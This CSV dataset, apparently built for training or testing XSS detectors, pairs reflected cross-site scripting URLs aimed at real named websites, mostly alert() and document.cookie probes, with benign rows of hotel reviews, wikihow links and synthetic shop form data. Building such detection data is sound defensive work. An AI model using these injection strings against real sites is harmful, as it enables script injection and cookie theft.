Payloads,Class,decoded,executed,parser_changed
http://webcenters.netscape.compuserve.com/weather/find.jsp?f=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;,Malicious,"http://webcenters.netscape.compuserve.com/weather/find.jsp?f=""><script>alert(1)</script>",True,True
https://www.bluetooth.org/apps/content/banner.aspx?banner_id=%22%3e%3cscript%3ealert%28document.cook<br>ie%29%3c/script%3e,Malicious,"https://www.bluetooth.org/apps/content/banner.aspx?banner_id=""><script>alert(document.cookie)</script>",True,True
http://mymanuskrip.fsktm.um.edu.my/greenstone/cgi-bin/library.exe?e=status-00000-00---off-0--00---0-<br>10-0---0---0prompt-10---4-------0-1l--10-en-50---20-welcome---0--1-00-0-0-01-1-0utfzz-8-00&amp;a=status&amp;<br>p=collectioninfo&amp;pr=nullproto&amp;c=test}%3c/style%3e%3cscript%3ea=eval;b=alert;a(b(/xss/.source));%3c/s<br>cript%3e%27%22%3e%3cmarquee%3e%3ch1%3ehhhhh%3c/h1%3e%3c/marquee%3e,Malicious,"http://mymanuskrip.fsktm.um.edu.my/greenstone/cgi-bin/library.exe?e=status-00000-00---off-0--00---0-10-0---0---0prompt-10---4-------0-1l--10-en-50---20-welcome---0--1-00-0-0-01-1-0utfzz-8-00&a=status&p=collectioninfo&pr=nullproto&c=test}</style><script>a=eval;b=alert;a(b(/xss/.source));</script>'""><marquee><h1>hhhhh</h1></marquee>",True,True
"convenient facilities spolit by a rude desk staff posture we selected this hotel because its convenient location near lax int'l airport. we were given a very large room, quiet, rather clean (except the worn carpet), with 2 king beds (our request was for a queen bed) good points: the room, which was very hot at our arrival revealed an a/c breakdown which was rather quickly and well repaired. the breakfast is generous and good, with attentive service provided. the room service is acceptable. the shuttle service is convenient and frequent, chauffeured by a smiling person.therefore, our stay would have been ok if we were not gratified with a rude welcome by the desk staff: our car well parked near the front door has to be moved immediately, even before having time enough to put our luggage in the room. no welcome of any kind from the unsmiling and desinterested desk people (the desk clerk was occupied in training a new assistant, and therefore seemed disturbed by our venue). all requests we kindly made (miles on our fidelity card, description of the room proposed, map of the local area, location of the l.a. museum of contemporary art, the famous moca) were answered negative!y, or more often just by a simple word: no! (ooh, what peaceful the customer service would be if there were never any client coming! is likely to be the policy observed by the desk staff). as a kind of confirmation of what is said above, the check out was again very poor (no answer when we said good morning, nor please nor thank you!), with a wrong billing of 2 parking fees (16$/night), adjusted on request without any kind of apology. conclusion :hotel offering good facilities, spoilt by an inacceptable and unpleasant desk staff posture. mr hilton please put a notice panelled above the front desk and saying : smiling doesn't cause any heavy desease, please do train your desk staff and improve deeply their customer service ability, do it for your new clients, because as far as we are concerned, we shall never come back again in this hotel!",Benign,"convenient facilities spolit by a rude desk staff posture we selected this hotel because its convenient location near lax int'l airport. we were given a very large room, quiet, rather clean (except the worn carpet), with 2 king beds (our request was for a queen bed) good points: the room, which was very hot at our arrival revealed an a/c breakdown which was rather quickly and well repaired. the breakfast is generous and good, with attentive service provided. the room service is acceptable. the shuttle service is convenient and frequent, chauffeured by a smiling person.therefore, our stay would have been ok if we were not gratified with a rude welcome by the desk staff: our car well parked near the front door has to be moved immediately, even before having time enough to put our luggage in the room. no welcome of any kind from the unsmiling and desinterested desk people (the desk clerk was occupied in training a new assistant, and therefore seemed disturbed by our venue). all requests we kindly made (miles on our fidelity card, description of the room proposed, map of the local area, location of the l.a. museum of contemporary art, the famous moca) were answered negative!y, or more often just by a simple word: no! (ooh, what peaceful the customer service would be if there were never any client coming! is likely to be the policy observed by the desk staff). as a kind of confirmation of what is said above, the check out was again very poor (no answer when we said good morning, nor please nor thank you!), with a wrong billing of 2 parking fees (16$/night), adjusted on request without any kind of apology. conclusion :hotel offering good facilities, spoilt by an inacceptable and unpleasant desk staff posture. mr hilton please put a notice panelled above the front desk and saying : smiling doesn't cause any heavy desease, please do train your desk staff and improve deeply their customer service ability, do it for your new clients, because as far as we are concerned, we shall never come back again in this hotel!",False,False
http://coordstatuti.regione.marche.it/cerca/search.php?query=%22%3e%3cscript%3ealert(%22xss%22)%3c/s<br>cript%3e&amp;start=89&amp;search=1&amp;results=10&amp;type=and&amp;domain=,Malicious,"http://coordstatuti.regione.marche.it/cerca/search.php?query=""><script>alert(""xss"")</script>&start=89&search=1&results=10&type=and&domain=",True,True
"sickening food i recently stayed at the renaissance stanford court for a conference. i got food poisoning from an appetizer in the hotel bar, one colleague got food poisoning from the hotel restaurant, and yet another colleague's wife got sick from the hotel restaurant.the hotel itself has grand architecture and a nice location, but things like the food -- as well as the fact that the stairways are very few and nearly impossible to locate (making this place a firetrap and earthquake trap) -- really overshadow the edifice and decor.",Benign,"sickening food i recently stayed at the renaissance stanford court for a conference. i got food poisoning from an appetizer in the hotel bar, one colleague got food poisoning from the hotel restaurant, and yet another colleague's wife got sick from the hotel restaurant.the hotel itself has grand architecture and a nice location, but things like the food -- as well as the fact that the stairways are very few and nearly impossible to locate (making this place a firetrap and earthquake trap) -- really overshadow the edifice and decor.",False,False
http://2churl.net/livemarket1/%3ciframe%20src=javascript:alert('xss');%3e%3c/iframe%3e,Malicious,http://2churl.net/livemarket1/<iframe src=javascript:alert('xss');></iframe>,True,True
http://www.syrianwebsites.com/index.php?cat=&quot;&gt;&lt;script&gt;alert(123);&lt;/script&gt;,Malicious,"http://www.syrianwebsites.com/index.php?cat=""><script>alert(123);</script>",True,True
entrar&login=hartford&pwd=v5llo34&remember=on&b1=entrar,Benign,entrar&login=hartford&pwd=v5llo34&remember=on&b1=entrar,False,False
http://biomed.vghtpe.gov.tw/info.php?a[]=%3cscript%3ealert(/xssed_by_omeha/);%3c/script%3e%3cscript%<br>3ealert(document.cookie);%3c/script%3e,Malicious,http://biomed.vghtpe.gov.tw/info.php?a[]=<script>alert(/xssed_by_omeha/);</script><script>alert(document.cookie);</script>,True,True
http://www.cafemom.com/login.php?successurl=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(1);&lt;/script&gt;,Malicious,"http://www.cafemom.com/login.php?successurl=""></a><script>alert(1);</script>",True,True
insertar&precio=2306&b1=pasar+por+caja,Benign,insertar&precio=2306&b1=pasar por caja,False,False
http://tr.asus.com/prog_content/middle_search_products.aspx?searchkey=%253d%2522%253e%253c%2573%2563<br>%2572%2569%2570%2574%253e%2561%256c%2565%2572%2574%2528%2564%256f%2563%2575%256d%2565%256e%2574%252e<br>%2563%256f%256f%256b%2569%2565%2529%253c%252f%2573%2563%2572%2569%2570%2574%253e,Malicious,"http://tr.asus.com/prog_content/middle_search_products.aspx?searchkey==""><script>alert(document.cookie)</script>",True,True
registro&login=rousseau&password=6pa439ue494s&nombre=silvino&apellidos=belito+cede%f1o&email=kootenay.ramos%40mayoriasilenciosa.bi&dni=05315763a&direccion=c%2f+pirucha+s%2fn+4-e&ciudad=gallocanta&cp=14810&provincia=zamora&ntc=5258739000426196&b1=registrar,Benign,registro&login=rousseau&password=6pa439ue494s&nombre=silvino&apellidos=belito cede�o&email=kootenay.ramos@mayoriasilenciosa.bi&dni=05315763a&direccion=c/ pirucha s/n 4-e&ciudad=gallocanta&cp=14810&provincia=zamora&ntc=5258739000426196&b1=registrar,False,False
http://chealth.canoe.ca/browse_alphabetically.asp?search_letter=%22%3e%3cscript%3ealert(%22by%20enco<br>re%20!%22)%3c/script%3e,Malicious,"http://chealth.canoe.ca/browse_alphabetically.asp?search_letter=""><script>alert(""by encore !"")</script>",True,True
http://www.blogsofporn.com/search.php?q=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.blogsofporn.com/search.php?q=""><script>alert(""maxwel"")</script>",True,True
"<script src=""http://astar.baidu.com/forum/home.php?mod=misc&amp;ac=sendmail&amp;rand=1462879718"" type=""text/javascript""></script>",Benign,"<script src=""http://astar.baidu.com/forum/home.php?mod=misc&ac=sendmail&rand=1462879718"" type=""text/javascript""></script>",False,True
entrar&login=renken&pwd=36815dat1ra&remember=off&b1=entrar,Benign,entrar&login=renken&pwd=36815dat1ra&remember=off&b1=entrar,False,False
http://www.wikihow.com/make-encrypted-backups-of-your-files&t=1396533657531&n=1123097&k=mainentity,Benign,http://www.wikihow.com/make-encrypted-backups-of-your-files&t=1396533657531&n=1123097&k=mainentity,False,False
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=o.neall&password=098a25t6s&nombre=jidit&apellidos=jurado&email=baggett7%40youtubeanunciox.ht&dni=91050642j&direccion=avinguda+sant+julia+59%2c+&ciudad=alfara+de+carles&cp=38570&provincia=burgos&ntc=4530913896674618&b1=registrar,Benign,"http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=o.neall&password=098a25t6s&nombre=jidit&apellidos=jurado&email=baggett7@youtubeanunciox.ht&dni=91050642j&direccion=avinguda sant julia 59, &ciudad=alfara de carles&cp=38570&provincia=burgos&ntc=4530913896674618&b1=registrar",False,False
"as superficial as a hollywood set having stayed six nights at the langham place there is a huge disconnect between my impressions of this property and the praises sung by some of the comments listed by others on this site. the hotel in my estimation is all style and no substance. in fact, it reminds me of a hollywood set. once you go beyond the surface, it becomes apparent that the hotel is very ordinary and average in many ways and not deserving of anything more than 3 to 4 stars. 5 starsé¥î?mpossible!i break my impressions into the tangible qualities of the hotel and the intangible qualities related to service level. first, with the tangibles: i booked two rooms for my stay, one an executive room for my children and the other a studio room. the executive rooms are tiny even by hk standards. ié¥???e stayed at every major hong kong hotel over the years and the only other hotel with smaller rooms is the kowloon hotel in tst. if you are traveling as a couple and are big boned westerners you are going to be bumping into things in the executive room. the smallness of the rooms also contributes to the deterioration that is evident in the bump and scratch that results from moving luggage that is inevitable due to space restrictions. there is limited storage space and tiny closets to house your clothes and i found we had to live out of our suitcases. the quality of the furnishings are all sizzle and no steak. all of the casework (cabinetry) are cheaply made, hollow core doors, the drawers are melamine interiors vs. real wood found in other hotels. plus, the amount of drawerspace is limited. the carpeting reminds me of giraffe skin and feels like cheap office-commercial carpeting underfoot. the é¥?¸lissfulé¥?bed is the biggest marketing hype ever, if you like your beds firm, ité¥??? like sleeping on a slab. the large flat screen tv is a plus, but ité¥??? there for the hotelé¥??? benefit, there is no way they can shoehorn an armoire into the room so they put the flat screen on the wall to save space. the bathrooms look nice but is not all that functional and as with the room, is compact. the shower has no light so you shower in the dark, the marble is cheap looking white marble (the kind you see in mainland hotels in abundance), and the glass sink with countertop is an example of gee-wizz design that compromises on functionality. the counter is so small that i found our things constantly falling off it onto the floor. look closer at the bath hardware and ité¥??? already starting to tarnish, blister or rusted. look at the tile grout and ité¥??? discolored. this is not what you would expect for a so called 5 star property and one that is barely a year old. water pressure is fine so no faults there. desk amenities are minimal, a pad with one sheet of paper left to it, and dog-eared and stained hotel brochures and magazines. the common spaces in the hotel is where the owners put all the money. the lobbies, elevators and entry are all very nicely decorated using expensive finishes. the original art is also quite nice to look at. the tradeoff is a richer look in the common areas at the expense of the rooms. restaurants and bars é¥?we ate the buffet breakfast at the place. the buffet is nothing to write home about. very ordinary by hk standards. the dim-sum selections barely edible. service was chaotic. i observed many people running around in frenzied activity but they would pass us up ten times with dirty plates piling up on the table. i had to ask for coffee refills every time even though the coffee lady walked by us a dozen times. kind of reminded me of an episode of the keystone cops, a lot of activity but none of it actually orchestrated in a meaningful way. i wanted to write a comment to the manager of the service in the buffet, but when i pulled out the comment card that was attached to the payment bill i found it was an older one already filled out by another customer",Benign,"as superficial as a hollywood set having stayed six nights at the langham place there is a huge disconnect between my impressions of this property and the praises sung by some of the comments listed by others on this site. the hotel in my estimation is all style and no substance. in fact, it reminds me of a hollywood set. once you go beyond the surface, it becomes apparent that the hotel is very ordinary and average in many ways and not deserving of anything more than 3 to 4 stars. 5 starsé¥î?mpossible!i break my impressions into the tangible qualities of the hotel and the intangible qualities related to service level. first, with the tangibles: i booked two rooms for my stay, one an executive room for my children and the other a studio room. the executive rooms are tiny even by hk standards. ié¥???e stayed at every major hong kong hotel over the years and the only other hotel with smaller rooms is the kowloon hotel in tst. if you are traveling as a couple and are big boned westerners you are going to be bumping into things in the executive room. the smallness of the rooms also contributes to the deterioration that is evident in the bump and scratch that results from moving luggage that is inevitable due to space restrictions. there is limited storage space and tiny closets to house your clothes and i found we had to live out of our suitcases. the quality of the furnishings are all sizzle and no steak. all of the casework (cabinetry) are cheaply made, hollow core doors, the drawers are melamine interiors vs. real wood found in other hotels. plus, the amount of drawerspace is limited. the carpeting reminds me of giraffe skin and feels like cheap office-commercial carpeting underfoot. the é¥?¸lissfulé¥?bed is the biggest marketing hype ever, if you like your beds firm, ité¥??? like sleeping on a slab. the large flat screen tv is a plus, but ité¥??? there for the hotelé¥??? benefit, there is no way they can shoehorn an armoire into the room so they put the flat screen on the wall to save space. the bathrooms look nice but is not all that functional and as with the room, is compact. the shower has no light so you shower in the dark, the marble is cheap looking white marble (the kind you see in mainland hotels in abundance), and the glass sink with countertop is an example of gee-wizz design that compromises on functionality. the counter is so small that i found our things constantly falling off it onto the floor. look closer at the bath hardware and ité¥??? already starting to tarnish, blister or rusted. look at the tile grout and ité¥??? discolored. this is not what you would expect for a so called 5 star property and one that is barely a year old. water pressure is fine so no faults there. desk amenities are minimal, a pad with one sheet of paper left to it, and dog-eared and stained hotel brochures and magazines. the common spaces in the hotel is where the owners put all the money. the lobbies, elevators and entry are all very nicely decorated using expensive finishes. the original art is also quite nice to look at. the tradeoff is a richer look in the common areas at the expense of the rooms. restaurants and bars é¥?we ate the buffet breakfast at the place. the buffet is nothing to write home about. very ordinary by hk standards. the dim-sum selections barely edible. service was chaotic. i observed many people running around in frenzied activity but they would pass us up ten times with dirty plates piling up on the table. i had to ask for coffee refills every time even though the coffee lady walked by us a dozen times. kind of reminded me of an episode of the keystone cops, a lot of activity but none of it actually orchestrated in a meaningful way. i wanted to write a comment to the manager of the service in the buffet, but when i pulled out the comment card that was attached to the payment bill i found it was an older one already filled out by another customer",False,False
http://forumeco.com/articles/portraits.php?idp=-1%22%3e%3cscript%3ealert%28document.cookie%29;%3c/sc<br>ript%3e,Malicious,"http://forumeco.com/articles/portraits.php?idp=-1""><script>alert(document.cookie);</script>",True,True
insertar&precio=6411&b1=pasar+por+caja,Benign,insertar&precio=6411&b1=pasar por caja,False,False
http://yaggs.de/searchterms/search?searchterm%5bname%5d=%22%3e%3cscript%3ealert%281%29%3c%2fscript%3<br>e&amp;go=suchen,Malicious,"http://yaggs.de/searchterms/search?searchterm[name]=""><script>alert(1)</script>&go=suchen",True,True
http://webguild.org/user/registration.php?returl=/user/myspace.php%22%3e'%3e%3cscript%3ealert('x')%3<br>c/script%3e,Malicious,"http://webguild.org/user/registration.php?returl=/user/myspace.php"">'><script>alert('x')</script>",True,True
http://insideapple.apple.com/updateacct/cbx-cgi.do?v=2&amp;la=fr&amp;lc=fr%27%22%3e%3c/title%3e%3cscript%3ea<br>lert(%22xss%22);%3c/script%3e%3cmarquee%20bgcolor=%22red%22%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c<br>/marquee%3e,Malicious,"http://insideapple.apple.com/updateacct/cbx-cgi.do?v=2&la=fr&lc=fr'""></title><script>alert(""xss"");</script><marquee bgcolor=""red""><h1>xss by xylitol</h1></marquee>",True,True
http://crypto.stanford.edu/cs155old/cs155-spring09/proj3/sendmail.php?to=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(1);&lt;/sc<br>ript&gt;,Malicious,"http://crypto.stanford.edu/cs155old/cs155-spring09/proj3/sendmail.php?to=""></a><script>alert(1);</script>",True,True
http://cars.mlogic.mobi/vehicle_search_step1.jsp?a=m&amp;type=used%27%22%3e%3c/title%3e%3cscript%3ealert<br>(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious,"http://cars.mlogic.mobi/vehicle_search_step1.jsp?a=m&type=used'""></title><script>alert(1337)</script>><marquee><h1>xss by xylitol</h1></marquee>",True,True
http://nixi.in/?textsize=small&amp;option=com_content&amp;task=blogcategory&amp;id=14&amp;itemid=46&amp;catid=1%3e%22%3e<br>%3cscript%20%0d%0a%3ealert%28/xssed%20by%20rohitbansal/%29%3b%3c/script%3e,Malicious,"http://nixi.in/?textsize=small&option=com_content&task=blogcategory&id=14&itemid=46&catid=1>""><script 
>alert(/xssed by rohitbansal/);</script>",True,True
"nice place showreview(3345103, 'full');",Benign,"nice place showreview(3345103, 'full');",False,False
http://www.wikihow.com/find-the-secret-windows-7-themes&t=1396611023692&n=4740638&k=mainentity,Benign,http://www.wikihow.com/find-the-secret-windows-7-themes&t=1396611023692&n=4740638&k=mainentity,False,False
registro&login=bangert&password=5ositi2v9&nombre=olivio&apellidos=narvarte+delgado&email=parola%40zonamodelos.pl&dni=72588518n&direccion=plaza+cinco+villas%2c+103%2c+&ciudad=prats+de+rei%2c+els&cp=16417&provincia=huesca&ntc=5885536306326029&b1=registrar,Benign,"registro&login=bangert&password=5ositi2v9&nombre=olivio&apellidos=narvarte delgado&email=parola@zonamodelos.pl&dni=72588518n&direccion=plaza cinco villas, 103, &ciudad=prats de rei, els&cp=16417&provincia=huesca&ntc=5885536306326029&b1=registrar",False,False
"great price, very clean, but noisy! i stayed at this hotel for a couple of nights and really got what i was looking for - cheap, clean and central. the hotel is 50yds walk from the nearest metro station (paral lel) and 10 minutes walk to las ramblas and the waterfront. sagrada familia is reached on the same line (15 minutes) and the bus station 20 minutes with 1 change on the metro. buffet breakfast is included and ok (served 7.30 - 10.30), but don't leave it until 10am to go down for it, as it is pandemonium!!! the hotel itself is clean if a little out",Benign,"great price, very clean, but noisy! i stayed at this hotel for a couple of nights and really got what i was looking for - cheap, clean and central. the hotel is 50yds walk from the nearest metro station (paral lel) and 10 minutes walk to las ramblas and the waterfront. sagrada familia is reached on the same line (15 minutes) and the bus station 20 minutes with 1 change on the metro. buffet breakfast is included and ok (served 7.30 - 10.30), but don't leave it until 10am to go down for it, as it is pandemonium!!! the hotel itself is clean if a little out",False,False
insertar&precio=7766&b1=confirmar,Benign,insertar&precio=7766&b1=confirmar,False,False
Would probably not go back.... Traveled w/ a large group for a wedding. They have no ability to accomo,Benign,Would probably not go back.... Traveled w/ a large group for a wedding. They have no ability to accomo,False,False
"great stay! we had the great privilege of staying at the hollywood orchid suites right at the end of a very long holiday. during our holiday we stayed at various hotels and resorts and backpacker accommodations - so we have seen and experienced a little bit of everything. we all agreed that this was one of the nicest places we have stayed and apart from all the plusses, also the most economic of all. our internet booking was responded to very fast and efficient. i had to change our booking due to a change in our travel plans and it was dealt with just as efficiently. we booked a junior suite and when we arrived we were told that we have been upgraded to a bigger suite - at the same price! the room was an absolute delight - big room with two massive beds, tv, aircon and a big kitchen with dining area. after being on the road and eating out of restaurants for 3 weeks, it was such a pleasure to be able to cook again. the staff at the reception was extremely helpful and gave us very good advice on where to go and what to see. the hotel is also ideally situated - right behind the kodak teather (where the oscars are held) and also on the walk of fame. also a great shopping centre right next to it. although many people say that this area is touristy and rundown, we did not think so at all. well, it is touristy, but there is a great excitement in the air. we only had a day and é in the area, so did the walk of fame, ripleys (we have a 6 year old!), took the bus to santa monica and booked the celebrity house tour - which turned out to be a really interesting tour with regards to la and where things are happening. i would definitely stay here again!",Benign,"great stay! we had the great privilege of staying at the hollywood orchid suites right at the end of a very long holiday. during our holiday we stayed at various hotels and resorts and backpacker accommodations - so we have seen and experienced a little bit of everything. we all agreed that this was one of the nicest places we have stayed and apart from all the plusses, also the most economic of all. our internet booking was responded to very fast and efficient. i had to change our booking due to a change in our travel plans and it was dealt with just as efficiently. we booked a junior suite and when we arrived we were told that we have been upgraded to a bigger suite - at the same price! the room was an absolute delight - big room with two massive beds, tv, aircon and a big kitchen with dining area. after being on the road and eating out of restaurants for 3 weeks, it was such a pleasure to be able to cook again. the staff at the reception was extremely helpful and gave us very good advice on where to go and what to see. the hotel is also ideally situated - right behind the kodak teather (where the oscars are held) and also on the walk of fame. also a great shopping centre right next to it. although many people say that this area is touristy and rundown, we did not think so at all. well, it is touristy, but there is a great excitement in the air. we only had a day and é in the area, so did the walk of fame, ripleys (we have a 6 year old!), took the bus to santa monica and booked the celebrity house tour - which turned out to be a really interesting tour with regards to la and where things are happening. i would definitely stay here again!",False,False
http://webcast.berkeley.edu/events.php?p=1&amp;ipp=1000&amp;category=%3c/title%3e%3cscript%3ealert(1);%3c/sc<br>ript%3e,Malicious,http://webcast.berkeley.edu/events.php?p=1&ipp=1000&category=</title><script>alert(1);</script>,True,True
"(function(){\r\rm.addmodelfns({\r\r\tsupport_feedback_form: {\r\tcallback: function( txt ) {\r\t\tui.success( txt.info );\r\t\tui.box.close();\r\t}\r}\r\r}).addeventfns({\r\r\rinvite_addemail:{\r\tclick: function() {\r\t\tvar input1 = document.getelementbyid(\""email_input\"").value,\r\t\t\t$email_input = $(\""#email_input\""),\r\t\t\tdinput = this.parentmodel.childevents[\""email\""][0],\r\t\t\tdinputclone = dinput.clonenode( true );\r\r\t\tdinputclone.value = \""\"";\r\t\t$email_input.append( dinputclone );\r\t\tm( dinputclone );\r\r\t\treturn false;\r\t}\r}\r\r});\r\r})();'",Benign,"(function(){\r\rm.addmodelfns({\r\r\tsupport_feedback_form: {\r\tcallback: function( txt ) {\r\t\tui.success( txt.info );\r\t\tui.box.close();\r\t}\r}\r\r}).addeventfns({\r\r\rinvite_addemail:{\r\tclick: function() {\r\t\tvar input1 = document.getelementbyid(\""email_input\"").value,\r\t\t\t$email_input = $(\""#email_input\""),\r\t\t\tdinput = this.parentmodel.childevents[\""email\""][0],\r\t\t\tdinputclone = dinput.clonenode( true );\r\r\t\tdinputclone.value = \""\"";\r\t\t$email_input.append( dinputclone );\r\t\tm( dinputclone );\r\r\t\treturn false;\r\t}\r}\r\r});\r\r})();'",False,False
http://www.wikihow.com/make-a-satellite-roof-mount&t=1396562656872&n=2563196&k=mainentity,Benign,http://www.wikihow.com/make-a-satellite-roof-mount&t=1396562656872&n=2563196&k=mainentity,False,False
http://www.wikihow.com/live-sustainably-with-solar-energy-(solar-photovoltaic-/-p.v.-electric-power)&t=1396563908956&n=2641670&k=mainentity,Benign,http://www.wikihow.com/live-sustainably-with-solar-energy-(solar-photovoltaic-/-p.v.-electric-power)&t=1396563908956&n=2641670&k=mainentity,False,False
registro&login=wun&password=intercesoriamente&nombre=betty&apellidos=tejo&email=katcher%40tabernarinconete.nr&dni=45295566x&direccion=c%2f+errementariena+31%2c+&ciudad=tord%f3mar&cp=25471&provincia=burgos&ntc=6590914640490551&b1=registrar,Benign,"registro&login=wun&password=intercesoriamente&nombre=betty&apellidos=tejo&email=katcher@tabernarinconete.nr&dni=45295566x&direccion=c/ errementariena 31, &ciudad=tord�mar&cp=25471&provincia=burgos&ntc=6590914640490551&b1=registrar",False,False
http://www.scoutseeklo.be/new/takken.php?tak=&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.scoutseeklo.be/new/takken.php?tak=><script>alert(""maxwel"")</script>",True,True
"é?îâ¬?°¥?»©é?ï½?»§ showreview(23389449, 'full');",Benign,"é?îâ¬?°¥?»©é?ï½?»§ showreview(23389449, 'full');",False,False
"a really top class resort stayed here just one night for a quick spa break with a girlfriend. the sales representative on the phone convinced me with her attitude and friendliness that this would be a good place for me and my friend, who was going through a tough time emotionally.it offers a great luxury alternative to big chain spa hotels. it is in a beautiful, historic setting that creates a much more intimate ambience. i would go back with my husband for a romantic weekend, definitely.it was beautiful, relaxing, and the service was excellent. our room was huge, and although it overlooked the parking lot, still had a nice view, and was extremely comfortable. the beds were great, the bathtub was the size of a swimming pool.the grounds are absolutely lovely, and worth strolling round. the staff are really wonderful. everyone knew our names, and made sure they pronounced them properly.the restaurant was excellent, food, service, value for money (surprisingly reasonable, considering it is very highly rated).the spa is a little small for the size of the hotel. as it was very cold during our stay, we couldn't enjoy all the outdoor areas. if it had been warmer we would have probably spent longer there. the indoor relaxation areas are very small, and only two showers, which seems a little odd.only quibble with the room: poor lighting in the bathroom makes it hard for us middle-aged women to put on make-up!",Benign,"a really top class resort stayed here just one night for a quick spa break with a girlfriend. the sales representative on the phone convinced me with her attitude and friendliness that this would be a good place for me and my friend, who was going through a tough time emotionally.it offers a great luxury alternative to big chain spa hotels. it is in a beautiful, historic setting that creates a much more intimate ambience. i would go back with my husband for a romantic weekend, definitely.it was beautiful, relaxing, and the service was excellent. our room was huge, and although it overlooked the parking lot, still had a nice view, and was extremely comfortable. the beds were great, the bathtub was the size of a swimming pool.the grounds are absolutely lovely, and worth strolling round. the staff are really wonderful. everyone knew our names, and made sure they pronounced them properly.the restaurant was excellent, food, service, value for money (surprisingly reasonable, considering it is very highly rated).the spa is a little small for the size of the hotel. as it was very cold during our stay, we couldn't enjoy all the outdoor areas. if it had been warmer we would have probably spent longer there. the indoor relaxation areas are very small, and only two showers, which seems a little odd.only quibble with the room: poor lighting in the bathroom makes it hard for us middle-aged women to put on make-up!",False,False
http://www.wikihow.com/find-hidden-mickeys-at-walt-disney-world&t=1396527970639&n=855477&k=mainentity,Benign,http://www.wikihow.com/find-hidden-mickeys-at-walt-disney-world&t=1396527970639&n=855477&k=mainentity,False,False
http://www.artesnet.gov.ma/exemples/phpinfo.php?a[]=%3cscript%3ealert(/xssed_by_omeha/);%3c/script%3<br>e%3cscript%3ealert(document.cookie);%3c/script%3e,Malicious,http://www.artesnet.gov.ma/exemples/phpinfo.php?a[]=<script>alert(/xssed_by_omeha/);</script><script>alert(document.cookie);</script>,True,True
http://www.infolinks.com/signup/your-script.html?denied=true&amp;pid=166387&amp;url=%3cscript%3ealert('http:<br>//www.t3ch.in');%3c/script%3e,Malicious,http://www.infolinks.com/signup/your-script.html?denied=true&pid=166387&url=<script>alert('http://www.t3ch.in');</script>,True,True
overpriced and tiny rooms the kowloon is past it's use by,Benign,overpriced and tiny rooms the kowloon is past it's use by,False,False
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=lecouteu&pwd=defendedora&remember=on&b1=entrar,Benign,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=lecouteu&pwd=defendedora&remember=on&b1=entrar,False,False
http://www.areaimmobiliare.org/indice/default.asp?search=%22%3cscript%3ealert(%22found%20by%20hotpoc<br>kets%20of%20backslashsecurity.org%22)%3c/script%3e,Malicious,"http://www.areaimmobiliare.org/indice/default.asp?search=""<script>alert(""found by hotpockets of backslashsecurity.org"")</script>",True,True
http://www.wikihow.com/kill-vines&t=1396561705857&n=2505228&k=mainentity,Benign,http://www.wikihow.com/kill-vines&t=1396561705857&n=2505228&k=mainentity,False,False
thoroughly enjoyed our stay bw tuscan inn sf - king room,Benign,thoroughly enjoyed our stay bw tuscan inn sf - king room,False,False
http://www.wikihow.com/practice-vegan-organic-horticulture&t=1396561977825&n=2521172&k=mainentity,Benign,http://www.wikihow.com/practice-vegan-organic-horticulture&t=1396561977825&n=2521172&k=mainentity,False,False
http://www.liverpool.com/search/?tag=&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;,Malicious,"http://www.liverpool.com/search/?tag=""><script>alert(1);</script>",True,True
http://sa.feurl.com/index.php/&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;,Malicious,"http://sa.feurl.com/index.php/""><script>alert(1);</script>",True,True
